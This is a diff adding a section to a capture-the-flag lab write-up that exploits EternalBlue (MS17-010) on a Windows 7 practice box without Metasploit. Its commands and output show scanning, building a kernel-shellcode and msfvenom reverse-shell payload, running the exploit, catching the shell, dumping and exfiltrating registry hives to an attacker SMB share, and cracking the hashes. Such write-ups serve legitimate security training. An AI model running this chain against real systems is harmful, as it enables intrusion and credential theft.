@@ -352,3 +352,348 @@ With a new shell I was able to find each of the 3 flags in fairly standard locat
 - C:\flag1.txt flag{access_the_machine}
 - C:\Windows\system32\config\flag2.txt flag{sam_database_elevated_access}
 - C:\Users\Jon\Documents\flag3.txt flag{admin_documents_can_be_valuable}
+
+### Attacking Blue without Metasploit
+With the initial attack out of the way I decided to attempt the attack without the help of metasploit for directly for sourcing, packing and executing the exploit. This also imposes the restriction that I won't have access to meterpreter and all the benefits that adds for gaining a foothold.
+
+While I understood the attack and the host at this point I still decided to still run through the motions of host enumeration. For the sake of brevity, I will not repeat some of the callouts of the findings unless there are differences from the first attack.
+
+I started with an nmap scan with the only difference being that I now supplied `-oA $ATTACKTARGET` to write scan logs to the host with the target servers ip as a prefix. This was to make up for the limitation of not having the results automatically persisted in `msfdb`.
+
+```
+root@kali:~/ctf/scans# export ATTACKTARGET=10.10.87.38
+root@kali:~/ctf/scans# nmap -sV -sC -oA $ATTACKTARGET $ATTACKTARGET 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 02:45 UTC
+Nmap scan report for ip-10-10-87-38.eu-west-1.compute.internal (10.10.87.38)
+Host is up (0.00036s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE        VERSION
+135/tcp   open  msrpc          Microsoft Windows RPC
+139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server?
+|_ssl-date: 2020-11-11T02:47:18+00:00; 0s from scanner time.
+49152/tcp open  msrpc          Microsoft Windows RPC
+49153/tcp open  msrpc          Microsoft Windows RPC
+49154/tcp open  msrpc          Microsoft Windows RPC
+49158/tcp open  msrpc          Microsoft Windows RPC
+49160/tcp open  msrpc          Microsoft Windows RPC
+MAC Address: 02:FF:5C:EF:7E:F3 (Unknown)
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h30m00s, deviation: 3h00m00s, median: 0s
+|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:ff:5c:ef:7e:f3 (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Jon-PC
+|   NetBIOS computer name: JON-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-11-10T20:47:13-06:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-11-11T02:47:13
+|_  start_date: 2020-11-11T02:35:53
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 152.72 seconds
+```
+
+```
+root@kali:~/ctf/scans# nmap --script smb-enum-shares,smb-enum-users -p 445 -oA "$ATTACKTARGET_smb_enum" $ATTACKTARGET 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 02:52 UTC
+Nmap scan report for ip-10-10-87-38.eu-west-1.compute.internal (10.10.87.38)
+Host is up (0.00077s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 02:FF:5C:EF:7E:F3 (Unknown)
+
+Host script results:
+| smb-enum-shares: 
+|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
+|   account_used: <blank>
+|   \\10.10.87.38\ADMIN$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: <none>
+|   \\10.10.87.38\C$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: <none>
+|   \\10.10.87.38\IPC$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|_    Anonymous access: READ
+
+Nmap done: 1 IP address (1 host up) scanned in 2.80 seconds
+```
+
+```
+root@kali:~/ctf/scans# nmap --script vuln -p 445 -oA "$ATTACKTARGET_smb_vuln" $ATTACKTARGET 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 02:53 UTC
+Nmap scan report for ip-10-10-87-38.eu-west-1.compute.internal (10.10.87.38)
+Host is up (0.0011s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+MAC Address: 02:FF:5C:EF:7E:F3 (Unknown)
+
+Host script results:
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+Nmap done: 1 IP address (1 host up) scanned in 15.51 seconds
+```
+
+And once again the scans lead to the same conclusion that the host is vulnerable to eternalblue. So the next step was to hop on google and [exploitdb](https://www.exploit-db.com) to start looking for an exploit. 
+
+
+### Preparing the attack
+The first result that turned up was an exploit from Sleepya [Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) ](https://www.exploit-db.com/exploits/42031), while google pointed me to [worawit/MS17-010](https://github.com/worawit/MS17-010/). On further inspection they looked to be the same exploit however the worawit link provided shellcode that could be used as the basis for a payload.
+
+Looking further at the [eternalblue_kshellcode_x64.asm shellcode](https://github.com/worawit/MS17-010/blob/master/shellcode/eternalblue_kshellcode_x64.asm), it looked like the shellcode expected a user payload to be appended to the end of the binary both of which still needed to be prepared.
+
+```asm
+userland_start:
+userland_start_thread:
+    ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL)
+    xchg rdx, rax   ; rdx is CreateThread address passed from kernel
+    xor ecx, ecx    ; lpThreadAttributes = NULL
+    push rcx        ; lpThreadId = NULL
+    push rcx        ; dwCreationFlags = 0
+    mov r9, rcx     ; lpParameter = NULL
+    lea r8, [rel userland_payload]  ; lpStartAddr
+    mov edx, ecx    ; dwStackSize = 0
+    sub rsp, 0x20
+    call rax
+    add rsp, 0x30
+    ret
+    
+userland_payload:
+```
+
+With all this in mind, I then pulled down the python exploit script and shellcode and assembled the latter with nasm as a flat binary; then I generated an unstaged tcp reverse shell for windows as a payload, also a flat binary and joined the contents contents into a single `sc_joined.bin` payload. One pointless thing to note is I added an arbitrary nop sled to the payload. This could have been left out.
+
+```bash
+root@kali:~/ctf/scans# cd ../
+root@kali:~/ctf# mkdir exploits && cd exploits
+root@kali:~/ctf/exploits# curl -o 42031.py https://www.exploit-db.com/raw/42031
+root@kali:~/ctf/exploits# curl -sO https://raw.githubusercontent.com/worawit/MS17-010/master/shellcode/eternalblue_kshellcode_x64.asm
+root@kali:~/ctf/exploits# nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
+root@kali:~/ctf/exploits# msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows -f raw -n100 LPORT=443 LHOST=10.10.47.175 > reverse.bin
+No encoder specified, outputting raw payload
+Successfully added NOP sled of size 100 from x64/simple
+Payload size: 560 bytes
+root@kali:~/ctf/exploits# ls
+42031.py  eternalblue_kshellcode_x64.asm  reverse.bin  sc_joined.bin  sc_x64_kernel.bin
+root@kali:~/ctf/exploits# cat sc_x64_kernel.bin reverse.bin > sc_joined.bin 
+```
+
+#### Attacking
+To prepare to catch the reverse shell generated by the I stared a netcat listener on port 443 in a new terminal before returning to the original to install the single required python dependency `impacket` and kick off the attack.
+
+```bash
+root@kali:~# nc -lvnp 443
+listening on [any] 443 ...
+```
+
+```bash
+root@kali:~/ctf/exploits# pip2 install impacket
+... 
+root@kali:~/ctf/exploits# python2 42031.py $ATTACKTARGET sc_joined.bin 20
+shellcode size: 1332
+numGroomConn: 20
+Target OS: Windows 7 Professional 7601 Service Pack 1
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+done
+```
+
+After executing the above, I switched back to our open netcat process to confirm the success of the attack and was happy to find a Windows shell prompt.
+
+```bash
+root@kali:~# nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.47.175] from (UNKNOWN) [10.10.87.38] 49170
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>
+```
+
+### Foothold
+Unlike the first attack I knew this windows shell was extremely limited, and my first priority was to try to egress credentials so that I could escalate to a more stable access point.
+
+```
+C:\Windows\system32>net user
+net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    Jon                      
+The command completed with one or more errors.
+
+
+C:\Windows\system32>cd ../../
+cd ../../
+
+C:\>reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\sam C:\sam.save
+The operation completed successfully.
+
+C:\>reg.exe save hklm\security C:\security.save
+reg.exe save hklm\security C:\security.save
+The operation completed successfully.
+
+C:\>reg.exe save hklm\system c:\system.save
+reg.exe save hklm\system C:\system.save
+The operation completed successfully.
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\
+
+03/17/2019  01:27 PM                24 flag1.txt
+07/13/2009  09:20 PM    <DIR>          PerfLogs
+04/12/2011  02:28 AM    <DIR>          Program Files
+03/17/2019  04:28 PM    <DIR>          Program Files (x86)
+11/10/2020  10:18 PM            24,576 sam.save
+11/10/2020  10:18 PM            24,576 security.save
+11/10/2020  10:19 PM        12,353,536 system.save
+12/12/2018  09:13 PM    <DIR>          Users
+03/17/2019  04:36 PM    <DIR>          Windows
+               4 File(s)     12,402,712 bytes
+               5 Dir(s)  20,753,133,568 bytes free
+
+C:\>type flag1.txt
+type flag1.txt
+flag{access_the_machine}
+C:\>
+```
+
+The first step was identifying the local users and attempting to dump some crucial registers that I could attack offline. While doing this I happened to dump these registry hives in at the root of the `C:\`. In hindsight this was probably a poor choice of location as it would be much more likely to be caught here than in other locations. However in doing so I happened to spot the first flag `flag{access_the_machine}`.
+
+However now that I had the hives dumped on disk I still needed to figure out how to egress them to my local machine to attack. This lead me to reference an example from [ropnop's blog](https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb) and I decided to turn up an instance of the impacket-smbserver that comes preinstalled on Kali.
+
+```bash
+root@kali:~/# mkdir -p ctf/extractor && cd ctf/extractor
+
+root@kali:~/ctf/extractor# impacket-smbserver BLUE $PWD
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+
+root@kali:~# netstat -plunt | grep 445
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      1428/python3
+```
+
+From the target host I was now able to validate that I could see and connect to the newly started share and promptly copied the hives over.
+
+```
+C:\>net view \\10.10.47.175
+net view \\10.10.47.175
+Shared resources at \\10.10.47.175
+
+(null)
+
+Share name  Type  Used as  Comment  
+
+-------------------------------------------------------------------------------
+BLUE        Disk                    
+The command completed successfully.
+
+
+C:\>copy C:\sam.save \\10.10.47.175\BLUE\sam.save
+copy C:\sam.save \\10.10.47.175\BLUE\sam.save
+        1 file(s) copied.
+
+C:\>copy C:\security.save \\10.10.47.175\BLUE\security.save
+copy C:\security.save \\10.10.47.175\BLUE\security.save
+        1 file(s) copied.
+
+C:\>copy C:\system.save \\10.10.47.175\BLUE\system.save
+copy C:\system.save \\10.10.47.175\BLUE\system.save
+        1 file(s) copied.
+```
+
+With these credentials now available locally, I could extract the user hashes and perform the same attack with `john` that I performed before.
+
+```bash
+root@kali:~/ctf/extractor# impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x55bd17830e678f18a3110daf2c17d4c7
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xdc31ac35e19a18b00b5b066de3e8da898bf8da71
+dpapi_userkey:0xfaea7403f42b58e1a5dd35ee816185a953b1c795
+[*] NL$KM 
+ 0000   45 94 4A 93 A2 9D D2 8E  2B CF 5F DF 66 75 59 4C   E.J.....+._.fuYL
+ 0010   E9 BC B8 91 2C 66 59 1E  BF 53 1E 77 BE C2 9B 74   ....,fY..S.w...t
+ 0020   73 64 04 B4 56 EA 7D 6F  BA C2 1B 7E F0 BA 53 67   sd..V.}o...~..Sg
+ 0030   E6 E6 66 84 95 1F 90 60  42 EE 34 0A EE 99 9F 55   ..f....`B.4....U
+NL$KM:45944a93a29dd28e2bcf5fdf6675594ce9bcb8912c66591ebf531e77bec29b74736404b456ea7d6fbac21b7ef0ba5367e6e66684951f906042ee340aee999f55
+[*] Cleaning up...
+
+root@kali:~/ctf/extractor# impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL | egrep 'Administrator|Guest|Jon' > hash.txt
+root@kali:~/ctf/extractor# john -format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+                 (Administrator)
+alqfna22         (Jon)
+2g 0:00:00:00 DONE (2020-11-11 13:43) 2.985g/s 15224Kp/s 15224Kc/s 15231KC/s alr19882006..alpusidi
+Warning: passwords printed above might not be all those cracked
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed
+```
+
+#### Wrapping Up
+With the credentials in hand I decided to try my had at a remote desktop session. Which happily gave me access to a desktop.
+
+```bash
+root@kali:~# rdesktop -u Jon 10.10.87.38
+```
+
+![Jon's PC](/img/blue_boot2root_jon_pc.png)
+
+### Summary
+This attack really hammered in how simple metasploit makes some of the more tedious tasks. Not only sourcing and packing an exploit but in things like capturing the outputs of scans, handling setting up listeners to catch shells and the myriad of benefits meterpreter provides in stabalizing a shell, transfering files and pivoting. Despite all that, it was massively educational to be forced to read the exploit I was attempting to understand how to prepare it for use and it was fun attempting to pivot with only the resources I had available in the limited shell. 
